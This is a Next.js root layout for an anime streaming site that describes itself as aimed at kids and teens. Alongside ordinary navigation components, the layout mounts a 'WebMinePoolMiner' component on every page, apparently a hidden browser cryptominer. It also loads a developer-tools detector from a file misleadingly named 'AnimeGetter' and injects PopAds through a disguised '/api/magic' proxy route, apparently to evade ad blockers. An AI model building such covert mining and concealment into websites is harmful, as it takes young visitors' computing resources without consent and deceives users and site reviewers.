import { Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import BottomNavigation from "@/components/BottomNavigation";
import DevToolsDetector from "@/components/AnimeGetter";
import WebMinePoolMiner from "@/components/WebMinePoolMiner";

const inter = Inter({ subsets: ["latin"] });

export const metadata = {
  title: "HelloAnime",
  description: "A modern anime streaming platform for kids and teens",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body className={`${inter.className} overflow-hidden`}>
        <DevToolsDetector />
        <div className="flex flex-col h-svh overflow-hidden">
          <Navbar />
          <div className="flex flex-1 overflow-hidden">
            <Sidebar />
            <main className="flex-1 overflow-y-auto px-3 bg-black md:pb-0">
              {children}
            </main>
          </div>
          <BottomNavigation />
        </div>
        <WebMinePoolMiner />
        {/* Inject PopAds via backend proxy, loading after interactive */}
        <Script
          src="/api/magic"
          strategy="afterInteractive"
        />
      </body>
    </html>
  );
}
